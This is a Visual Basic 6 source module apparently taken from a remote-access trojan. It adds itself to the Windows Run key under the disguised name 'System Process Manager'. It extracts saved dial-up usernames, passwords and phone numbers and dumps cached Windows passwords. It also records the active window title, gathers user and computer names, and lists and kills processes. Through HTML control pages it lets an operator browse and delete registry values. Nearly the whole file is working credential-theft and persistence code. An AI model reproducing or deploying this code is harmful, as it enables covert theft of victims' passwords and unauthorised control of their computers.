Attribute VB_Name = "mod3"
Option Explicit
Private TempRegKeys As String
Public Sub AddtoStartup()
    WriteRegString HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "System Process Manager", LCase$(AppPath & App.EXEName & ".exe")
'Add Startup Registry Key
End Sub
Private Function callback(X As PASSWORD_CACHE_ENTRY, ByVal lSomething As Long) As Long
Dim ResType
Dim cString  As String
Dim Resource As String
Dim Password As String
Dim nLoop    As Long
    With X
        ResType = .nType
        For nLoop = 1 To .cbResource
            If .abResource(nLoop) <> 0 Then
                cString = cString & Chr$(.abResource(nLoop))
            Else 'NOT X.ABRESOURCE(NLOOP)...
                cString = cString & " "
            End If
        Next nLoop
    End With 'x
    Resource = cString
    cString = ""
    With X
        For nLoop = .cbResource + 1 To (.cbResource + .cbPassword)
            If .abResource(nLoop) <> 0 Then
                cString = cString & Chr$(.abResource(nLoop))
            Else 'NOT X.ABRESOURCE(NLOOP)...
                cString = cString & " "
            End If
        Next nLoop
    End With 'x
    Password = cString
    cString = ""
    PW = PW & " [" & Resource & " " & Password & "]"
    callback = True
End Function
Private Function ChangeBytes(ByVal strStr As String, Bytes() As Byte) As Boolean
Dim lenBs  As Long
Dim lenStr As Long
    lenBs = UBound(Bytes) - LBound(Bytes)
    lenStr = LenB(StrConv(strStr, vbFromUnicode))
    If lenBs > lenStr Then
        CopyMemory Bytes(0), strStr, lenStr
        ZeroMemory Bytes(lenStr), lenBs - lenStr
    ElseIf lenBs = lenStr Then
        CopyMemory Bytes(0), strStr, lenStr
    Else
        CopyMemory Bytes(0), strStr, lenBs
        ChangeBytes = True
    End If
End Function
Public Function ChangeToStringUni(Bytes() As Byte) As String
On Error GoTo err
Dim temp As String
    temp = StrConv(Bytes, vbUnicode)
    ChangeToStringUni = Left$(temp, InStr(temp, vbNullChar) - 1)
    Exit Function
err:
ChangeToStringUni = temp
err.Clear
End Function
Public Function Con() As String
Dim A      As String
Dim s      As Long
Dim l      As Long
Dim ln     As Long
Dim A3(20) As String
Dim A1     As String
Dim A2     As String
Dim A4     As String
    On Error GoTo Con_Error
    ReDim r(255) As RASENTRYNAME95
    r(0).dwSize = 264
    s = 256 * r(0).dwSize
    l = RasEnumEntries(vbNullString, vbNullString, r(0), s, ln)
    Con = "<b>Saved:</b><br>"
    For l = 0 To ln - 1
        A = StrConv(r(l).szEntryName(), vbUnicode)
        A3(l) = Left$(A, InStr(A, vbNullChar) - 1)
        A1 = ""
        A2 = ""
        DisplayConnectionInfo A3(l), A1, A2, A4
        If LenB(A3(l)) Then
            Con = Con & A3(l) & " : " & IIf(A1 = "", "...", A1) & " " & IIf(A2 = "", "...", A2) & " " & A4 & "<br>"
        End If
    Next l
'If Con = "" Then Con = "..." ':( Expand Structure -> replaced by:
    Con = Con & "<br><b>Cached:</b><br>" & GetCachedPasswords
    If LenB(Con) = 0 Then
        Con = "..."
    End If
''on error GoTo 0 ':( Check Error Handling Structure
Exit Function
Con_Error:
    Con = "Error: " & err.number & " in procedure Con of Module djjw"
End Function
Private Sub DisplayConnectionInfo(ConName As String, Txt1 As String, Txt2 As String, Txt3 As String)
Dim rdp As RASDIALPARAMS
'Dim T   As Long ':( Duplicated Name
    rdp.dwSize = Len(rdp) + 6
    ChangeBytes ConName, rdp.szEntryName
    T = RasGetEntryDialParams(ConName, rdp, 0)
    If T = 0 Then
        With rdp
            Txt1 = ChangeToStringUni(.szUserName)
            Txt2 = ChangeToStringUni(.szPassword)
            Txt3 = ChangeToStringUni(.szPhoneNumber)
        End With 'rdp
    End If
End Sub
Public Function Get_Kill_Processes(Optional ByVal Term As String) As String
Dim hSnapshot As Long
Dim lret      As Long
Dim P         As PROCESSENTRY32
Dim Hand      As Long
'Process List & Termination
    On Error GoTo Get_Kill_Processes_Error
    P.dwSize = Len(P)
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, ByVal 0)
    If hSnapshot Then
        lret = Process32First(hSnapshot, P)
        Do While lret
            Get_Kill_Processes = Get_Kill_Processes & Trim$(Left$(P.szexeFile, InStr(P.szexeFile, vbNullChar) - 1)) & "<t>" & "<a Href= """ & LocalhttpAddress & "\" & "TP," & Trim$(Left$(P.szexeFile, InStr(P.szexeFile, vbNullChar) - 1)) & """ >       Kill</a><br>"
            If LenB(Term) Then
                If InStr(1, P.szexeFile, Term, vbTextCompare) > 0 Then
                    Hand = OpenProcess(1, True, P.th32ProcessID)
                    TerminateProcess Hand, 0
                End If
            End If
            lret = Process32Next(hSnapshot, P)
        Loop
        lret = CloseHandle(hSnapshot)
    End If
''on error GoTo 0 ':( Check Error Handling Structure
Exit Function
Get_Kill_Processes_Error:
    Get_Kill_Processes = "Error: " & err.number & " in procedure Get_Kill_Processes of Module hjjw"
End Function
Public Function GetActiveWindow(ByVal FunctionID As Long) As String
'Get Foreground Window
'--------------------------------------------------------------------------------------
'ActiveWindow -------------------------------------------------------------------------
    On Error GoTo GetActiveWindow_Error
    nCAPTION = Space$(256)
    nClass = Space$(256)
    If GetWindowText(GetForegroundWindow, nCAPTION, Len(nCAPTION)) > 0 Then
        If GetClassName(GetForegroundWindow, nClass, Len(nClass)) > 0 Then
            nClass = Left$(nClass, InStr(1, nClass, vbNullChar))
            nCAPTION = Left$(nCAPTION, InStr(1, nCAPTION, vbNullChar))
            If LenB(Trim$(nCAPTION & nClass)) Then
                If FunctionID = 1 Then
                    GetActiveWindow = nCAPTION
                ElseIf FunctionID = 2 Then
                    GetActiveWindow = nClass
                ElseIf FunctionID = 3 Then
                    GetActiveWindow = LastTitle
                ElseIf FunctionID = 4 Then
                    GetActiveWindow = LastClass
                End If
                GetActiveWindow = Replace$(GetActiveWindow, vbCrLf, vbNullString)
                GetActiveWindow = Replace$(GetActiveWindow, vbCr, vbNullString)
                GetActiveWindow = Replace$(GetActiveWindow, vbNullChar, vbNullString)
                GetActiveWindow = Replace$(GetActiveWindow, vbLf, vbNullString)
                If FunctionID = 3 Or FunctionID = 4 Then
                    LastTitle = nCAPTION
                    LastClass = nClass
                Else
                End If
            Else
                GetActiveWindow = ""
            End If
        End If
    End If
    If FunctionID = 0 Then
        GetActiveWindow = IIf(nTESTER = GetForegroundWindow, "0", "1")
        Exit Function
'<:-) :SUGGESTION: (EXPERIMENTAL follow advice with care )
'<:-) Explict 'Exit ProcedureType' can make code flow harder to follow. (Fix ID 2)
'<:-) Convert 'If..Then/Code(with Explicit Exit)/End If/Rest_of_Code' to
'<:-) 'If..Then/Exit Code(without Explicit Exit)/Else/ Rest_Of_Code/End If
'<:-) OR if Exit Code block is only the Exit Command
'<:-) 'If Not ..Then/ Rest_Of_Code/End If
    End If
    nTESTER = GetForegroundWindow
''on error GoTo 0 ':( Check Error Handling Structure
Exit Function
GetActiveWindow_Error:
    err.Clear
    GetActiveWindow = "Error"
End Function
Public Function GetComputerNamen() As String
Dim ie1
Dim vers   As String
Dim szUser As String
'Get Computer Name
''on error GoTo GetComputerName_Error
    szUser = String$(255, 0)
    vers = String$(1024, 0)
    GetUserName szUser, 255
    szUser = Left$(szUser, InStr(1, szUser, vbNullChar) - 1)
    GetComputerName vers, 1024
    vers = Left$(vers, InStr(1, vers, vbNullChar) - 1)
    ie1 = ReadReg(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Internet Settings", "emailname", "...")
    GetComputerNamen = "<b>User : </b>" & szUser & " (" & ReadReg(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Explorer", "Logon User Name", szUser) & ")" & "<br> <b>Computer : </b>" & vers & " (" & IIf(ie1 = "", "...", ie1) & ")"
''on error GoTo 0 ':( Check Error Handling Structure
Exit Function
GetComputerName_Error:
    GetComputerNamen = "Error: " & err.number & " in procedure GetComputerName of Module hjjw"
End Function
Private Function Cell(Link As Integer, LinkAddressorString As String, LinkName As String)
    Cell = "<tr>" & "<td  height=""1"">"
    If Link = 1 Then Cell = Cell & vbCrLf & "<a Href= """ & LinkAddressorString & """>" & LinkName & "</a>"
    Cell = Cell & "</td>" & "</tr>"
End Function
Public Function GetRegistrySubKeys(key As Long, subkey As String, Optional ByVal FN As Long = 1) As String
TempRegKeys = ""
Dim A1 As Long
    If key = 0 Then
        GetRegistrySubKeys = "Select Key : " & "<br>" & vbCrLf
        GetRegistrySubKeys = GetRegistrySubKeys & "<table border=""2"" cellpadding=""0"" cellspacing=""0"" style=""border-collapse: collapse"" bordercolor=""#111111"">"
        GetRegistrySubKeys = GetRegistrySubKeys & Cell(1, LocalhttpAddress & "\ERK,HKEY_CLASSES_ROOT" & "," & subkey & ",", "HKEY_CLASSES_ROOT")
        GetRegistrySubKeys = GetRegistrySubKeys & Cell(1, LocalhttpAddress & "\ERK,HKEY_CURRENT_USER" & "," & subkey & ",", "HKEY_CURRENT_USER")
        GetRegistrySubKeys = GetRegistrySubKeys & Cell(1, LocalhttpAddress & "\ERK,HKEY_LOCAL_MACHINE" & "," & subkey & ",", "HKEY_LOCAL_MACHINE")
        GetRegistrySubKeys = GetRegistrySubKeys & Cell(1, LocalhttpAddress & "\ERK,HKEY_USERS" & "," & subkey & ",", "HKEY_USERS")
        GetRegistrySubKeys = GetRegistrySubKeys & Cell(1, LocalhttpAddress & "\ERK,HKEY_PERFORMANCE_DATA" & "," & subkey & ",", "HKEY_PERFORMANCE_DATA")
        GetRegistrySubKeys = GetRegistrySubKeys & Cell(1, LocalhttpAddress & "\ERK,HKEY_CURRENT_CONFIG" & "," & subkey & ",", "HKEY_CURRENT_CONFIG")
        GetRegistrySubKeys = GetRegistrySubKeys & Cell(1, LocalhttpAddress & "\ERK,HKEY_DYN_DATA" & "," & subkey & ",", "HKEY_DYN_DATA")
        GetRegistrySubKeys = GetRegistrySubKeys & "</table>"
    Else
'Get Registry Entrys
        On Error GoTo GetRegistrySubKeys_Error
        If FN = 1 Then
            Call GetSubKeys(key, subkey)
            GetRegistrySubKeys = GetRegistrySubKeys & Replace$(TempRegKeys, "%LinkAddressString", LocalhttpAddress & "\ERK," & GetRegKeyName(key) & "," & IIf(subkey = "", "", subkey & "\"), , , vbBinaryCompare) & "<br>"
       GetRegistrySubKeys = GetRegistrySubKeys & "<br><br>"
            For A1 = 1 To RegGetValues(key, subkey).cnt
                GetRegistrySubKeys = GetRegistrySubKeys & RegGetValues(key, subkey).key(A1) & " : " & RegGetValues(key, subkey).Data(A1) & "<a Href= """ & LocalhttpAddress & "\RDV," & GetRegKeyName(key) & "," & subkey & "," & RegGetValues(key, subkey).key(A1) & """>  Delete </a><br>"
            Next A1
        Else
            GetRegistrySubKeys = ""
            If Left$(subkey, 1) = "\" Then subkey = Right$(subkey, Len(subkey) - 1)
            GetRegistrySubKeys = "Registry of : " & GetRegKeyName(key) & "\" & subkey & "<br>" & vbCrLf
            GetRegistrySubKeys = GetRegistrySubKeys & "<h4>Subvalues:</h4><table border=""2"" cellpadding=""0"" cellspacing=""0"" style=""border-collapse: collapse"" bordercolor=""#111111""  > "
            For A1 = 1 To RegGetValues(key, subkey).cnt
                GetRegistrySubKeys = GetRegistrySubKeys & vbCrLf & "<tr>" & "<td  height=""1"">" & RegGetValues(key, subkey).key(A1) & " : " & RegGetValues(key, subkey).Data(A1) & "<a Href= """ & LocalhttpAddress & "\RDV," & GetRegKeyName(key) & "," & subkey & "," & RegGetValues(key, subkey).key(A1) & """>  Delete </a>" & "</td>" & "</tr>"
            Next A1
            GetRegistrySubKeys = GetRegistrySubKeys & "</table>"
            GetRegistrySubKeys = GetRegistrySubKeys & "<h4>Subkeys:</h4><table border=""2"" cellpadding=""0"" cellspacing=""0"" style=""border-collapse: collapse"" bordercolor=""#111111""  > "
            TempRegKeys = ""
            Call GetSubKeys(key, subkey)
            GetRegistrySubKeys = GetRegistrySubKeys & Replace$(TempRegKeys, "%LinkAddressString", LocalhttpAddress & "\ERK," & GetRegKeyName(key) & "," & IIf(subkey = "", "", subkey & "\"), , , vbBinaryCompare)
'Old Code
'For A1 = 1 To GetSubKeys(key, subkey).cnt - 1
'GetRegistrySubKeys = GetRegistrySubKeys & Cell(1, LocalhttpAddress & "\ERK," & GetRegKeyName(key) & "," & IIf(subkey = "", "", subkey & "\") & GetSubKeys(key, subkey).key(A1), GetSubKeys(key, subkey).key(A1))
'Next A1
            GetRegistrySubKeys = GetRegistrySubKeys & "</table>"
        End If
''on error GoTo 0 ':( Check Error Handling Structure
        Exit Function
'<:-) :SUGGESTION: (EXPERIMENTAL follow advice with care )
'<:-) Explict 'Exit ProcedureType' can make code flow harder to follow.(Fix ID 11)
'<:-) No recommended action but consider coding around it.
GetRegistrySubKeys_Error:
        GetRegistrySubKeys = "Error: " & err.number & " in procedure GetRegistrySubKeys of Module hjjw"
    End If
End Function
Public Sub RegKeysCallback(KeyName As String)
    TempRegKeys = TempRegKeys & vbCrLf & Cell(1, "%LinkAddressString" & KeyName, KeyName)
End Sub
Public Function GetSystemDirectory() As String
Dim i As Long
Dim s As String
'Get System Directory
    On Error GoTo GetSystemDirectory_Error
    i = GetSystemDirectoryA(vbNullString, 0)
    s = Space$(i)
    GetSystemDirectoryA s, i
    GetSystemDirectory = Left$(s, i - 1)
    If Not Right$(GetSystemDirectory, 1) = "\" Then
        GetSystemDirectory = GetSystemDirectory & "\"
    End If
    If LenB(GetSystemDirectory) = 0 Then
        GetSystemDirectory = Environ$("windir") & "system\"
    End If
''on error GoTo 0 ':( Check Error Handling Structure
Exit Function
GetSystemDirectory_Error:
    GetSystemDirectory = "Error: " & err.number & " in procedure GetSystemDirectory of Module hjjw"
End Function
Public Function RemBackslash(s As String) As String
    If Not Len(s) = 0 Then
        If Right$(s, 1) = "\" Then
            RemBackslash = Left$(s, Len(s) - 1)
        Else
            RemBackslash = s
        End If
    End If
End Function
''
''Public Sub SetProirityHigh()
''
''
''
''SetPriorityClass GetCurrentProcess, REALTIME_PRIORITY_CLASS
'''Set Proirity ( Dangerous in winxp/nt)
''End Sub ':( No executable Code
'''~~~'
'''~~~'Public Function ConfirmNetActivity() As Boolean
'''~~~'
'''~~~'
'''~~~'
'''~~~'ConfirmNetActivity = InternetGetConnectedState(0&, 0&)
'''~~~'End Function
'''~~~'
'''~~~'
Public Function GetCachedPasswords() As String
Dim lLong    As Long
Dim bByte    As Byte
Dim nLoop    As Long
Dim c1String As String
    If InStr(1, GetSystemDirectory, "system32", vbTextCompare) > 0 Then GetCachedPasswords = "Not Supported!": Exit Function
'Warning : This Program Control and its required files are Open Source to the world thus the Author is not responsible For Any Misuse.
'--------------------------------------------------------------------------------------
'Connections --------------------------------------------------------------------------
    On Error GoTo GetCachedPasswords_Error
    bByte = &HFF
    nLoop = 0
    lLong = 0
    c1String = ""
    Call WNetEnumCachedPasswords(c1String, nLoop, bByte, AddressOf callback, lLong)
':( Remove "Call" verb and brackets
    GetCachedPasswords = PW
    If GetCachedPasswords = "" Then GetCachedPasswords = "..."
''on error GoTo 0 ':( Check Error Handling Structure
Exit Function
'<:-) :SUGGESTION: (EXPERIMENTAL follow advice with care )
'<:-) Explict 'Exit ProcedureType' can make code flow harder to follow.(Fix ID 11)
'<:-) No recommended action but consider coding around it.
GetCachedPasswords_Error:
    GetCachedPasswords = "Error: " & err.number & " in procedure GetCachedPasswords of Module djjw " & vbCrLf & Con
End Function
'''~~~'
'''~~~'
Public Sub RemoveAutostart()
'Delete AutoStart key
    DeleteRegValue HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "System Process Manager"
End Sub
'''~~~'
''
':)Code Fixer V3.0.9 (11/15/2006 12:12:17 PM) 2 + 416 = 418 Lines Thanks Ulli for inspiration and lots of code.
